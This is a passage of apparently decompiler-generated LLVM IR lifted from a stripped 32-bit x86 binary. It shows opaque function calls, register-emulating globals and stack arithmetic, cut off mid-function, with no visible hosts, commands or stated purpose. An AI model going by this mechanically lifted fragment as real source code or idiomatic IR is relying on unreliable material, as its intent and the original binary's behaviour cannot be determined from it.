  %v3_804dec4 = inttoptr i32 %v2_804dec4 to i32*
  store i32 %v2_804deb8, i32* %v3_804dec4, align 4
  %v2_804dec8 = call i32 @function_8051350(i8 0)
  store i32 %v2_804dec8, i32* %eax.global-to-local, align 4
  %v0_804decd = load i32, i32* @esp, align 4
  %v1_804decd = inttoptr i32 %v0_804decd to i32*
  store i32 7, i32* %v1_804decd, align 4
  %v2_804ded4 = call i32 @function_8051350(i8 0)
  store i32 %v2_804ded4, i32* %eax.global-to-local, align 4
  %v0_804ded9 = load i32, i32* @esp, align 4
  %v1_804ded9 = inttoptr i32 %v0_804ded9 to i32*
  %v3_804ded9 = add i32 %v0_804ded9, 4
  %v1_804deda = inttoptr i32 %v3_804ded9 to i32*
  %v2_804deda = load i32, i32* %v1_804deda, align 4
  store i32 %v2_804deda, i32* @ebx, align 4
  store i32 0, i32* %v1_804deda, align 4
  store i32 6, i32* %v1_804ded9, align 4
  %v3_804dedf = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804dedf, i32* %eax.global-to-local, align 4
  %v0_804dee4 = load i32, i32* @esp, align 4
  %v1_804dee4 = inttoptr i32 %v0_804dee4 to i32*
  %v3_804dee4 = add i32 %v0_804dee4, 4
  %v1_804dee5 = inttoptr i32 %v3_804dee4 to i32*
  store i32 %v3_804dedf, i32* %v1_804dee5, align 4
  %v1_804dee7 = add i32 %v0_804dee4, 8328
  store i32 %v1_804dee7, i32* %eax.global-to-local, align 4
  store i32 %v1_804dee7, i32* %v1_804dee4, align 4
  %v3_804deef = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804deef, i32* %eax.global-to-local, align 4
  %v0_804def4 = load i32, i32* @esp, align 4
  %v1_804def4 = add i32 %v0_804def4, 8328
  %v1_804defb = inttoptr i32 %v0_804def4 to i32*
  %v3_804defb = add i32 %v0_804def4, 4
  %v2_804defc = add i32 %v1_804def4, %v3_804deef
  store i32 %v2_804defc, i32* @esi, align 4
  %v1_804defe = inttoptr i32 %v3_804defb to i32*
  %v2_804defe = load i32, i32* %v1_804defe, align 4
  store i32 %v2_804defe, i32* @ebx, align 4
  %v0_804deff = load i32, i32* @edi, align 4
  store i32 %v0_804deff, i32* %v1_804defe, align 4
  %v0_804df00 = load i32, i32* @esi, align 4
  store i32 %v0_804df00, i32* %v1_804defb, align 4
  %v3_804df01 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df01, i32* %eax.global-to-local, align 4
  store i32 %v3_804df01, i32* @ebx, align 4
  %v0_804df08 = load i32, i32* @esp, align 4
  %v1_804df08 = inttoptr i32 %v0_804df08 to i32*
  %v2_804df08 = load i32, i32* %v1_804df08, align 4
  store i32 %v2_804df08, i32* %eax.global-to-local, align 4
  %v3_804df08 = add i32 %v0_804df08, 4
  %v1_804df09 = inttoptr i32 %v3_804df08 to i32*
  store i32 0, i32* %v1_804df09, align 4
  store i32 7, i32* %v1_804df08, align 4
  %v3_804df0e = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804df0e, i32* %eax.global-to-local, align 4
  %v0_804df13 = load i32, i32* @esp, align 4
  %v1_804df13 = inttoptr i32 %v0_804df13 to i32*
  %v3_804df13 = add i32 %v0_804df13, 4
  %v1_804df14 = inttoptr i32 %v3_804df13 to i32*
  store i32 %v3_804df0e, i32* %v1_804df14, align 4
  %v0_804df16 = load i32, i32* @esi, align 4
  %v1_804df16 = load i32, i32* @ebx, align 4
  %v2_804df16 = add i32 %v1_804df16, %v0_804df16
  store i32 %v2_804df16, i32* %eax.global-to-local, align 4
  store i32 %v2_804df16, i32* %v1_804df13, align 4
  %v3_804df1a = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df1a, i32* %eax.global-to-local, align 4
  %v0_804df1f = load i32, i32* @esp, align 4
  %v1_804df1f = inttoptr i32 %v0_804df1f to i32*
  %v3_804df1f = add i32 %v0_804df1f, 4
  %v1_804df20 = inttoptr i32 %v3_804df1f to i32*
  %v2_804df20 = load i32, i32* %v1_804df20, align 4
  store i32 %v2_804df20, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804df20, align 4
  store i32 6, i32* %v1_804df1f, align 4
  %v3_804df25 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804df25, i32* %eax.global-to-local, align 4
  %v0_804df2a = load i32, i32* @esp, align 4
  %v1_804df2a = inttoptr i32 %v0_804df2a to i32*
  %v3_804df2a = add i32 %v0_804df2a, 4
  %v1_804df2b = inttoptr i32 %v3_804df2a to i32*
  %v2_804df2b = load i32, i32* %v1_804df2b, align 4
  store i32 %v2_804df2b, i32* @ebx, align 4
  store i32 %v3_804df25, i32* %v1_804df2b, align 4
  %v1_804df2d = add i32 %v0_804df2a, 8264
  store i32 %v1_804df2d, i32* %eax.global-to-local, align 4
  store i32 %v1_804df2d, i32* %v1_804df2a, align 4
  %v3_804df35 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df35, i32* %eax.global-to-local, align 4
  %v0_804df3a = load i32, i32* @esp, align 4
  %v1_804df3a = add i32 %v3_804df35, 8264
  %v2_804df41 = add i32 %v1_804df3a, %v0_804df3a
  store i32 %v2_804df41, i32* @esi, align 4
  %v1_804df43 = inttoptr i32 %v0_804df3a to i32*
  %v2_804df43 = load i32, i32* %v1_804df43, align 4
  store i32 %v2_804df43, i32* %eax.global-to-local, align 4
  %v3_804df43 = add i32 %v0_804df3a, 4
  %v1_804df44 = inttoptr i32 %v3_804df43 to i32*
  %v0_804df45 = load i32, i32* @edi, align 4
  store i32 %v0_804df45, i32* %v1_804df44, align 4
  %v0_804df46 = load i32, i32* @esi, align 4
  store i32 %v0_804df46, i32* %v1_804df43, align 4
  %v3_804df47 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df47, i32* %eax.global-to-local, align 4
  %v0_804df4c = load i32, i32* @esp, align 4
  %v1_804df4c = inttoptr i32 %v0_804df4c to i32*
  %v3_804df4c = add i32 %v0_804df4c, 4
  %v1_804df4d = inttoptr i32 %v3_804df4c to i32*
  store i32 %v3_804df47, i32* @ebx, align 4
  store i32 0, i32* %v1_804df4d, align 4
  store i32 11, i32* %v1_804df4c, align 4
  %v3_804df54 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804df54, i32* %eax.global-to-local, align 4
  %v0_804df59 = load i32, i32* @esp, align 4
  %v1_804df59 = inttoptr i32 %v0_804df59 to i32*
  %v3_804df59 = add i32 %v0_804df59, 4
  %v1_804df5a = inttoptr i32 %v3_804df59 to i32*
  store i32 %v3_804df54, i32* %v1_804df5a, align 4
  %v0_804df5c = load i32, i32* @esi, align 4
  %v1_804df5c = load i32, i32* @ebx, align 4
  %v2_804df5c = add i32 %v1_804df5c, %v0_804df5c
  store i32 %v2_804df5c, i32* %eax.global-to-local, align 4
  store i32 %v2_804df5c, i32* %v1_804df59, align 4
  %v3_804df60 = call i32 @function_8051cc0(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df60, i32* %eax.global-to-local, align 4
  %v0_804df65 = load i32, i32* @esp, align 4
  %v1_804df65 = inttoptr i32 %v0_804df65 to i32*
  store i32 6, i32* %v1_804df65, align 4
  %v2_804df6c = call i32 @function_80512d0(i8 0)
  store i32 %v2_804df6c, i32* %eax.global-to-local, align 4
  %v0_804df71 = load i32, i32* @esp, align 4
  %v1_804df71 = inttoptr i32 %v0_804df71 to i32*
  store i32 7, i32* %v1_804df71, align 4
  %v2_804df78 = call i32 @function_80512d0(i8 0)
  %v0_804df7d = load i32, i32* @esp, align 4
  %v1_804df80 = add i32 %v0_804df7d, 8
  %v2_804df80 = inttoptr i32 %v1_804df80 to i32*
  store i32 4095, i32* %v2_804df80, align 4
  %v1_804df85 = add i32 %v0_804df7d, 4168
  store i32 %v1_804df85, i32* @edi, align 4
  %v2_804df8c = add i32 %v0_804df7d, 4
  %v3_804df8c = inttoptr i32 %v2_804df8c to i32*
  store i32 %v1_804df85, i32* %v3_804df8c, align 4
  %v1_804df8d = add i32 %v0_804df7d, 8328
  store i32 %v1_804df8d, i32* %eax.global-to-local, align 4
  %v3_804df94 = inttoptr i32 %v0_804df7d to i32*
  store i32 %v1_804df8d, i32* %v3_804df94, align 4
  %v4_804df95 = call i32 @function_8052412(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804df95, i32* %eax.global-to-local, align 4
  %v0_804df9a = load i32, i32* @esp, align 4
  %v1_804df9a = add i32 %v0_804df9a, 16
  store i32 %v4_804df95, i32* @ebx, align 4
  %v10_804df9f = icmp eq i32 %v4_804df95, -1
  br i1 %v10_804df9f, label %dec_label_pc_804e0c7, label %dec_label_pc_804dfa8

dec_label_pc_804dfa8:                             ; preds = %dec_label_pc_804deb3
  %v2_804dfa8 = add i32 %v4_804df95, 4152
  %v3_804dfa8 = add i32 %v2_804dfa8, %v1_804df9a
  %v4_804dfa8 = inttoptr i32 %v3_804dfa8 to i8*
  store i8 0, i8* %v4_804dfa8, align 1
  %v0_804dfb0 = load i32, i32* @esp, align 4
  %v1_804dfb3 = add i32 %v0_804dfb0, -16
  %v2_804dfb3 = inttoptr i32 %v1_804dfb3 to i32*
  store i32 10, i32* %v2_804dfb3, align 4
  %v2_804dfb5 = call i32 @function_8051350(i8 0)
  store i32 %v2_804dfb5, i32* %eax.global-to-local, align 4
  %v0_804dfba = load i32, i32* @esp, align 4
  %v1_804dfba = inttoptr i32 %v0_804dfba to i32*
  %v3_804dfba = add i32 %v0_804dfba, 4
  %v1_804dfbb = inttoptr i32 %v3_804dfba to i32*
  %v2_804dfbb = load i32, i32* %v1_804dfbb, align 4
  store i32 %v2_804dfbb, i32* @esi, align 4
  store i32 0, i32* %v1_804dfbb, align 4
  store i32 10, i32* %v1_804dfba, align 4
  %v3_804dfc0 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  %v0_804dfc5 = load i32, i32* @esp, align 4
  %v2_804dfc8 = add i32 %v0_804dfc5, 8
  %v3_804dfc8 = inttoptr i32 %v2_804dfc8 to i32*
  store i32 %v3_804dfc0, i32* %v3_804dfc8, align 4
  %v0_804dfc9 = load i32, i32* @ebx, align 4
  %v1_804dfc9 = add i32 %v0_804dfc9, -1
  store i32 %v1_804dfc9, i32* %eax.global-to-local, align 4
  %v2_804dfcc = add i32 %v0_804dfc5, 4
  %v3_804dfcc = inttoptr i32 %v2_804dfcc to i32*
  store i32 %v1_804dfc9, i32* %v3_804dfcc, align 4
  %v1_804dfcd = add i32 %v0_804dfc5, 4168
  store i32 %v1_804dfcd, i32* @edi, align 4
  %v3_804dfd4 = inttoptr i32 %v0_804dfc5 to i32*
  store i32 %v1_804dfcd, i32* %v3_804dfd4, align 4
  %v4_804dfd5 = call i32 @function_8051f90(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804dfda = load i32, i32* @esp, align 4
  %v1_804dfdd = add i32 %v4_804dfd5, 1
  %v8_804dfdd = icmp eq i32 %v1_804dfdd, 0
  store i32 %v1_804dfdd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dfdd, label %dec_label_pc_804dffd, label %dec_label_pc_804dfe0

dec_label_pc_804dfe0:                             ; preds = %dec_label_pc_804dfa8
  %v1_804dfe3 = add i32 %v0_804dfda, 4168
  store i32 %v1_804dfe3, i32* %eax.global-to-local, align 4
  %v3_804dfea = inttoptr i32 %v0_804dfda to i32*
  store i32 %v1_804dfe3, i32* %v3_804dfea, align 4
  %v0_804dfeb = call i32 @function_8052530()
  store i32 %v0_804dfeb, i32* %eax.global-to-local, align 4
  %v0_804dff0 = load i32, i32* @esp, align 4
  %v1_804dff0 = inttoptr i32 %v0_804dff0 to i32*
  %v2_804dff0 = load i32, i32* %v1_804dff0, align 4
  store i32 %v2_804dff0, i32* %eax.global-to-local, align 4
  %v3_804dff0 = add i32 %v0_804dff0, 4
  %v1_804dff1 = inttoptr i32 %v3_804dff0 to i32*
  store i32 9, i32* %v1_804dff1, align 4
  %v0_804dff4 = load i32, i32* @ebp, align 4
  store i32 %v0_804dff4, i32* %v1_804dff0, align 4
  %v4_804dff5 = call i32 @function_8052320(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dff5, i32* %eax.global-to-local, align 4
  %v0_804dffa = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dffd

dec_label_pc_804dffd:                             ; preds = %dec_label_pc_804dfa8, %dec_label_pc_804dfe0
  %v0_804dffd.in = phi i32 [ %v0_804dfda, %dec_label_pc_804dfa8 ], [ %v0_804dffa, %dec_label_pc_804dfe0 ]
  %v2_804e000 = inttoptr i32 %v0_804dffd.in to i32*
  store i32 10, i32* %v2_804e000, align 4
  %v2_804e002 = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e002, i32* %eax.global-to-local, align 4
  %v0_804e007 = call i32 @function_8052295()
  store i32 %v0_804e007, i32* %eax.global-to-local, align 4
  %v0_804e00c = load i32, i32* @esp, align 4
  %v1_804e00c = add i32 %v0_804e00c, 16
  %v0_804e00f = load i32, i32* @ebp, align 4
  %v12_804e00f = icmp eq i32 %v0_804e00f, %v0_804e007
  br i1 %v12_804e00f, label %dec_label_pc_804e038, label %dec_label_pc_804e013

dec_label_pc_804e013:                             ; preds = %dec_label_pc_804dffd
  %v0_804e013 = call i32 @function_80522bb()
  store i32 %v0_804e013, i32* %eax.global-to-local, align 4
  %v0_804e018 = load i32, i32* @ebp, align 4
  %v12_804e018 = icmp eq i32 %v0_804e018, %v0_804e013
  %v0_804e03a.pre = load i32, i32* @esp, align 4
  br i1 %v12_804e018, label %dec_label_pc_804e038, label %dec_label_pc_804e01c

dec_label_pc_804e01c:                             ; preds = %dec_label_pc_804e013
  %v2_804e01c = add i32 %v0_804e03a.pre, -4
  %v3_804e01c = inttoptr i32 %v2_804e01c to i32*
  store i32 %v0_804e013, i32* %v3_804e01c, align 4
  %v2_804e01d = add i32 %v0_804e03a.pre, -8
  %v3_804e01d = inttoptr i32 %v2_804e01d to i32*
  store i32 %v0_804e013, i32* %v3_804e01d, align 4
  %v0_804e01e = load i32, i32* @global_var_80569c0.22, align 64
  store i32 %v0_804e01e, i32* %eax.global-to-local, align 4
  %v2_804e023 = add i32 %v0_804e03a.pre, -12
  %v3_804e023 = inttoptr i32 %v2_804e023 to i32*
  store i32 %v0_804e01e, i32* %v3_804e023, align 4
  %v1_804e024 = add i32 %v0_804e03a.pre, 4152
  store i32 %v1_804e024, i32* @edi, align 4
  %v2_804e02b = add i32 %v0_804e03a.pre, -16
  %v3_804e02b = inttoptr i32 %v2_804e02b to i32*
  store i32 %v1_804e024, i32* %v3_804e02b, align 4
  %v0_804e02c = call i32 @function_8052010()
  store i32 %v0_804e02c, i32* %eax.global-to-local, align 4
  %v0_804e031 = load i32, i32* @esp, align 4
  %v3_804e034 = trunc i32 %v0_804e02c to i8
  %v4_804e034 = icmp eq i8 %v3_804e034, 0
  br i1 %v4_804e034, label %dec_label_pc_804e093, label %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge

dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge: ; preds = %dec_label_pc_804e01c
  %v1_804e031 = add i32 %v0_804e031, 16
  %v0_804e038.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804e038

dec_label_pc_804e038:                             ; preds = %dec_label_pc_804e013, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge, %dec_label_pc_804dffd
  %v0_804e03a = phi i32 [ %v1_804e031, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge ], [ %v1_804e00c, %dec_label_pc_804dffd ], [ %v0_804e03a.pre, %dec_label_pc_804e013 ]
  %v0_804e038 = phi i32 [ %v0_804e038.pre, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge ], [ %v0_804e007, %dec_label_pc_804dffd ], [ %v0_804e013, %dec_label_pc_804e013 ]
  store i32 %v0_804e038, i32* @esi, align 4
  %v1_804e03a = add i32 %v0_804e03a, 8
  %v2_804e03a = inttoptr i32 %v1_804e03a to i32*
  %v3_804e03a = load i32, i32* %v2_804e03a, align 4
  store i32 %v3_804e03a, i32* @ebx, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804de50
  %v1_804e046 = add i32 %v0_804de5d, 32
  %v2_804e046 = inttoptr i32 %v1_804e046 to i32*
  %v3_804e046 = load i32, i32* %v2_804e046, align 4
  store i32 %v3_804e046, i32* @eax, align 4
  %v3_804e04a = inttoptr i32 %v0_804de5d to i32*
  store i32 %v3_804e046, i32* %v3_804e04a, align 4
  %v0_804e04b = call i32 @function_8052594()
  store i32 %v0_804e04b, i32* %eax.global-to-local, align 4
  %v0_804e050 = load i32, i32* @esp, align 4
  %v1_804e050 = add i32 %v0_804e050, 16
  br label %dec_label_pc_804de10

dec_label_pc_804e058:                             ; preds = %dec_label_pc_804de92
  %v0_804e058 = load i32, i32* @ebp, align 4
  %v7_804e05e = icmp sgt i32 %v0_804e058, 400
  br i1 %v7_804e05e, label %dec_label_pc_804e064, label %dec_label_pc_804de50

dec_label_pc_804e064:                             ; preds = %dec_label_pc_804e058
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804e069 = add i32 %v0_804de9e, 28
  %v2_804e069 = inttoptr i32 %v1_804e069 to i32*
  %v3_804e069 = load i32, i32* %v2_804e069, align 4
  %v10_804e069 = udiv i32 %v3_804e069, 2
  store i32 %v10_804e069, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804e077 = load i32, i32* %v2_804e069, align 4
  %v15_804e077 = icmp eq i32 %v3_804e077, 0
  %v1_804e07b = icmp eq i1 %v15_804e077, false
  br i1 %v1_804e07b, label %dec_label_pc_804de50, label %dec_label_pc_804e081

dec_label_pc_804e081:                             ; preds = %dec_label_pc_804e064
  %v2_804e084 = inttoptr i32 %v0_804de9e to i32*
  store i32 1, i32* %v2_804e084, align 4
  %v1_804e086 = call i32 @function_8053df0(i32 0)
  store i32 %v1_804e086, i32* %eax.global-to-local, align 4
  %v0_804e08b = load i32, i32* @esp, align 4
  %v1_804e08b = add i32 %v0_804e08b, 16
  br label %dec_label_pc_804de50

dec_label_pc_804e093:                             ; preds = %dec_label_pc_804e01c
  %v2_804e093 = add i32 %v0_804e031, 12
  %v3_804e093 = inttoptr i32 %v2_804e093 to i32*
  store i32 %v0_804e02c, i32* %v3_804e093, align 4
  %v2_804e094 = add i32 %v0_804e031, 8
  %v3_804e094 = inttoptr i32 %v2_804e094 to i32*
  store i32 %v0_804e02c, i32* %v3_804e094, align 4
  %v1_804e095 = add i32 %v0_804e031, 4
  %v2_804e095 = inttoptr i32 %v1_804e095 to i32*
  store i32 0, i32* %v2_804e095, align 4
  %v1_804e097 = add i32 %v0_804e031, 4168
  store i32 %v1_804e097, i32* %eax.global-to-local, align 4
  %v3_804e09e = inttoptr i32 %v0_804e031 to i32*
  store i32 %v1_804e097, i32* %v3_804e09e, align 4
  %v3_804e09f = call i32 @function_8052352(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e09f, i32* %eax.global-to-local, align 4
  %v0_804e0a4 = load i32, i32* @esp, align 4
  store i32 %v3_804e09f, i32* @ebx, align 4
  %v10_804e0a9 = icmp eq i32 %v3_804e09f, -1
  %v1_804e0ac = icmp eq i1 %v10_804e0a9, false
  br i1 %v1_804e0ac, label %dec_label_pc_804e0bb, label %dec_label_pc_804e0ae

dec_label_pc_804e0ae:                             ; preds = %dec_label_pc_804e093
  %v0_804e0ae = load i32, i32* @edi, align 4
  %v2_804e0ae = add i32 %v0_804e0a4, 12
  %v3_804e0ae = inttoptr i32 %v2_804e0ae to i32*
  store i32 %v0_804e0ae, i32* %v3_804e0ae, align 4
  %v0_804e0af = load i32, i32* @edi, align 4
  %v2_804e0af = add i32 %v0_804e0a4, 8
  %v3_804e0af = inttoptr i32 %v2_804e0af to i32*
  store i32 %v0_804e0af, i32* %v3_804e0af, align 4
  %v1_804e0b0 = add i32 %v0_804e0a4, 4
  %v2_804e0b0 = inttoptr i32 %v1_804e0b0 to i32*
  store i32 9, i32* %v2_804e0b0, align 4
  %v0_804e0b2 = load i32, i32* @ebp, align 4
  %v3_804e0b2 = inttoptr i32 %v0_804e0a4 to i32*
  store i32 %v0_804e0b2, i32* %v3_804e0b2, align 4
  %v4_804e0b3 = call i32 @function_8052320(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e0b3, i32* %eax.global-to-local, align 4
  %v0_804e0b8 = load i32, i32* @esp, align 4
  %v0_804e0be.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e0bb

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804e093, %dec_label_pc_804e0ae
  %v0_804e0be = phi i32 [ %v3_804e09f, %dec_label_pc_804e093 ], [ %v0_804e0be.pre, %dec_label_pc_804e0ae ]
  %v0_804e0bb.in = phi i32 [ %v0_804e0a4, %dec_label_pc_804e093 ], [ %v0_804e0b8, %dec_label_pc_804e0ae ]
  %v3_804e0be = inttoptr i32 %v0_804e0bb.in to i32*
  store i32 %v0_804e0be, i32* %v3_804e0be, align 4
  %v1_804e0bf = call i32 @function_8052241(i32 0)
  store i32 %v1_804e0bf, i32* %eax.global-to-local, align 4
  %v0_804e0c4 = load i32, i32* @esp, align 4
  %v1_804e0c4 = add i32 %v0_804e0c4, 16
  br label %dec_label_pc_804e0c7

dec_label_pc_804e0c7:                             ; preds = %dec_label_pc_804deb3, %dec_label_pc_804e0bb
  %v1_804e0c7 = phi i32 [ %v1_804df9a, %dec_label_pc_804deb3 ], [ %v1_804e0c4, %dec_label_pc_804e0bb ]
  %v0_804e0c7 = load i32, i32* @esi, align 4
  %v2_804e0c7 = add i32 %v1_804e0c7, -4
  %v3_804e0c7 = inttoptr i32 %v2_804e0c7 to i32*
  store i32 %v0_804e0c7, i32* %v3_804e0c7, align 4
  %v0_804e0c8 = load i32, i32* @esi, align 4
  %v2_804e0c8 = add i32 %v1_804e0c7, -8
  %v3_804e0c8 = inttoptr i32 %v2_804e0c8 to i32*
  store i32 %v0_804e0c8, i32* %v3_804e0c8, align 4
  %v1_804e0c9 = add i32 %v1_804e0c7, -12
  %v2_804e0c9 = inttoptr i32 %v1_804e0c9 to i32*
  store i32 0, i32* %v2_804e0c9, align 4
  %v1_804e0cb = add i32 %v1_804e0c7, 8312
  %v2_804e0d2 = add i32 %v1_804e0c7, -16
  %v3_804e0d2 = inttoptr i32 %v2_804e0d2 to i32*
  store i32 %v1_804e0cb, i32* %v3_804e0d2, align 4
  %v3_804e0d3 = call i32 @function_8052352(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v1_804e0d8 = load i32, i32* @esp, align 4
  %v2_804e0d8 = add i32 %v1_804e0d8, 56
  %v3_804e0d8 = inttoptr i32 %v2_804e0d8 to i32*
  store i32 %v3_804e0d3, i32* %v3_804e0d8, align 4
  %v0_804e0dc = load i32, i32* @esp, align 4
  %v1_804e0df = add i32 %v3_804e0d3, 1
  %v8_804e0df = icmp eq i32 %v1_804e0df, 0
  store i32 %v1_804e0df, i32* @eax, align 4
  br i1 %v8_804e0df, label %dec_label_pc_804e31c, label %dec_label_pc_804e0e6

dec_label_pc_804e0e6:                             ; preds = %dec_label_pc_804e0c7
  %v2_804e0e9 = inttoptr i32 %v0_804e0dc to i32*
  store i32 12, i32* %v2_804e0e9, align 4
  %v2_804e0eb = call i32 @function_8051350(i8 0)
  store i32 %v2_804e0eb, i32* %eax.global-to-local, align 4
  %v0_804e0f0 = load i32, i32* @esp, align 4
  %v1_804e0f0 = inttoptr i32 %v0_804e0f0 to i32*
  store i32 13, i32* %v1_804e0f0, align 4
  %v2_804e0f7 = call i32 @function_8051350(i8 0)
  store i32 %v2_804e0f7, i32* %eax.global-to-local, align 4
  %v0_804e0fc = load i32, i32* @esp, align 4
  %v1_804e0fc = inttoptr i32 %v0_804e0fc to i32*
  store i32 14, i32* %v1_804e0fc, align 4
  %v2_804e103 = call i32 @function_8051350(i8 0)
  store i32 %v2_804e103, i32* %eax.global-to-local, align 4
  %v0_804e108 = load i32, i32* @esp, align 4
  %v1_804e108 = inttoptr i32 %v0_804e108 to i32*
  store i32 15, i32* %v1_804e108, align 4
  %v2_804e10f = call i32 @function_8051350(i8 0)
  store i32 %v2_804e10f, i32* %eax.global-to-local, align 4
  %v0_804e114 = load i32, i32* @esp, align 4
  %v1_804e114 = inttoptr i32 %v0_804e114 to i32*
  store i32 16, i32* %v1_804e114, align 4
  %v2_804e11b = call i32 @function_8051350(i8 0)
  store i32 %v2_804e11b, i32* %eax.global-to-local, align 4
  %v0_804e120 = load i32, i32* @esp, align 4
  %v1_804e120 = inttoptr i32 %v0_804e120 to i32*
  %v3_804e120 = add i32 %v0_804e120, 4
  %v1_804e121 = inttoptr i32 %v3_804e120 to i32*
  %v1_804e122 = add i32 %v0_804e120, 8436
  store i32 %v1_804e122, i32* %eax.global-to-local, align 4
  store i32 %v1_804e122, i32* %v1_804e121, align 4
  store i32 12, i32* %v1_804e120, align 4
  %v3_804e12c = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804e12c, i32* %eax.global-to-local, align 4
  %v1_804e131 = load i32, i32* @esp, align 4
  %v2_804e131 = add i32 %v1_804e131, 52
  %v3_804e131 = inttoptr i32 %v2_804e131 to i32*
  store i32 %v3_804e12c, i32* %v3_804e131, align 4
  %v0_804e135 = load i32, i32* @esp, align 4
  %v1_804e135 = inttoptr i32 %v0_804e135 to i32*
  %v3_804e135 = add i32 %v0_804e135, 4
  %v1_804e136 = inttoptr i32 %v3_804e135 to i32*
  %v1_804e137 = add i32 %v0_804e135, 8432
  store i32 %v1_804e137, i32* %eax.global-to-local, align 4
  store i32 %v1_804e137, i32* %v1_804e136, align 4
  store i32 13, i32* %v1_804e135, align 4
  %v3_804e141 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804e141, i32* %eax.global-to-local, align 4
  %v1_804e146 = load i32, i32* @esp, align 4
  %v2_804e146 = add i32 %v1_804e146, 48
  %v3_804e146 = inttoptr i32 %v2_804e146 to i32*
  store i32 %v3_804e141, i32* %v3_804e146, align 4
  %v0_804e14a = load i32, i32* @esp, align 4
  %v1_804e14a = inttoptr i32 %v0_804e14a to i32*
  %v3_804e14a = add i32 %v0_804e14a, 4
  %v1_804e14b = inttoptr i32 %v3_804e14a to i32*
  %v2_804e14b = load i32, i32* %v1_804e14b, align 4
  store i32 %v2_804e14b, i32* @edi, align 4
  %v1_804e14c = add i32 %v0_804e14a, 8428
  store i32 %v1_804e14c, i32* %eax.global-to-local, align 4
  store i32 %v1_804e14c, i32* %v1_804e14b, align 4
  store i32 14, i32* %v1_804e14a, align 4
  %v3_804e156 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804e156, i32* %eax.global-to-local, align 4
  %v1_804e15b = load i32, i32* @esp, align 4
  %v2_804e15b = add i32 %v1_804e15b, 44
  %v3_804e15b = inttoptr i32 %v2_804e15b to i32*
  store i32 %v3_804e156, i32* %v3_804e15b, align 4
  %v0_804e15f = load i32, i32* @esp, align 4
  %v1_804e15f = inttoptr i32 %v0_804e15f to i32*
  %v3_804e15f = add i32 %v0_804e15f, 4
  %v1_804e160 = inttoptr i32 %v3_804e15f to i32*
  %v2_804e160 = load i32, i32* %v1_804e160, align 4
  store i32 %v2_804e160, i32* @ebx, align 4
  %v1_804e161 = add i32 %v0_804e15f, 8440
  store i32 %v1_804e161, i32* %eax.global-to-local, align 4
  store i32 %v1_804e161, i32* %v1_804e160, align 4
  store i32 15, i32* %v1_804e15f, align 4
  %v3_804e16b = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804e16b, i32* %eax.global-to-local, align 4
  %v1_804e170 = load i32, i32* @esp, align 4
  %v2_804e170 = add i32 %v1_804e170, 40
  %v3_804e170 = inttoptr i32 %v2_804e170 to i32*
  store i32 %v3_804e16b, i32* %v3_804e170, align 4
  %v0_804e174 = load i32, i32* @esp, align 4
  %v1_804e174 = inttoptr i32 %v0_804e174 to i32*
  %v3_804e174 = add i32 %v0_804e174, 4
  %v1_804e175 = inttoptr i32 %v3_804e174 to i32*
  %v1_804e176 = add i32 %v0_804e174, 8424
  store i32 %v1_804e176, i32* %eax.global-to-local, align 4
  store i32 %v1_804e176, i32* %v1_804e175, align 4
  store i32 16, i32* %v1_804e174, align 4
  %v3_804e180 = call i32 @function_80512a0(i32 0, i32* nonnull @0)
  store i32 %v3_804e180, i32* %eax.global-to-local, align 4
  %v1_804e185 = load i32, i32* @esp, align 4
  %v2_804e185 = add i32 %v1_804e185, 36
  %v3_804e185 = inttoptr i32 %v2_804e185 to i32*
  store i32 %v3_804e180, i32* %v3_804e185, align 4
  %v0_804e189 = load i32, i32* @esp, align 4
  %v1_804e189 = add i32 %v0_804e189, 16
  %v0_804e18c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e288, %dec_label_pc_804e2a0.backedge, %dec_label_pc_804e297, %dec_label_pc_804e0e6
